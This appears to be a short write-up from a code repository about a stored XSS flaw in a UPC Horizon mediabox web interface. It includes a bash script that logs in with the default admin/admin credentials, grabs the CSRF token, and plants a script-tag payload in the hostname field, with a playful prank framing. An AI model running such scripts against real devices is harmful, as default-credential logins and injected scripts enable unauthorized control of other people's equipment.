# Javascript XSS

It is of course no problem at all, but there is no proper sanitizing going on in some of the fields in the user interface.

![upc box webinterface](https://raw.github.com/mrquincle/horizon/master/js_clientside/horizon_webinterface.png)

A script like this will be fun for your sweetheart. :-)

    #!/bin/bash
    
    # Mediabox url
    mediabox_url=http://192.168.0.32/cgi-bin
    
    # Store cookie in cookie.txt, stores a sessionID
    cookie=cookie.txt
    
    # Login as admin/admin
    curl -v -H "User-Agent: Mozilla/5.0" -H "Connection: keep-alive" --cookie  $cookie --cookie-jar $cookie "$mediabox_url/sendResult.cgi?action=login&page=login&username=admin&password=admin"
        
    # get token
    token=$(curl -s --cookie $cookie -H "User-Agent: Mozilla/5.0" -X GET $mediabox_url/basic.cgi | grep token_csrf | cut -f4 -d' ' | cut -f2 -d'=' | tr -d "\"")
    echo "Token obtained: $token"

    # construct payload
    payload='"/><script>alert("Hi my sweetheart")</script>'
    echo "Use payload: $payload"

    # send the command to the box
    curl -s --cookie $cookie -H "User-Agent: Mozilla/5.0" --data "page=basic" --data "token_csrf=$token" --data "action=saveInternet" --data "hostname=$payload" $mediabox_url/sendResult.cgi&section=internet

    echo "Navigation now to: http://192.168.0.32/cgi-bin/basic.cgi"

If your girlfriend now goes to http://192.168.0.32 and then the Basic tab, she will get a popup.

Be very careful with this, and make sure you backup your system before this (it's on one of the other tab pages). However, if you screw up totally you can always set the thing to factory defaults via the television itself. But do not complain if you screw it up such that you cannot change those basic settings anymore for example. :-)
